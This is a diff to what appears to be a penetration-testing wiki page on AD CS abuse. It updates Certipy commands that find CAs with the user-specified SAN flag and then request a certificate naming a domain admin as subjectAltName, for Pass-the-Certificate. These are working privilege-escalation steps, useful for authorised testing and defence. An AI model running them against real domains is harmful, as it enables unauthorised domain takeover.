@@ -19,7 +19,8 @@ If the CA is configured with the  `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (admins 
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate info about the CAs, including the "**User Specified SAN**" flag state which is an alias to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.
 
 ```python
-certipy 'domain.local'/'user':'password'@'domaincontroller' find | grep "User Specified SAN"
+certipy find 'domain.local'/'user':'password'@'domain_controller'
+grep "User Specified SAN" "DATE_Certipy.txt" 
 ```
 
 {% hint style="info" %}
@@ -33,13 +34,13 @@ Certipy's `auto` mode can also be used to automatically abuse a misconfigured CA
 The same "find" command can be used to enumerate information regarding the certificate templates (EKUs allowing for authentication, allowing low-priv users to enroll, etc.).
 
 ```bash
-certipy 'domain.local'/'user':'password'@'domaincontroller' find
+certipy find 'domain.local'/'user':'password'@'domain_controller'
 ```
 
 Once the right template is found (i.e. the default User template), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).
 
 ```bash
-certipy 'domain.local'/'user':'password'@'ca_server' req -ca 'ca_name' -template 'certificate template' -alt 'domain admin'
+certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -template 'certificate template' -alt 'domain admin'
 ```
 
 The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
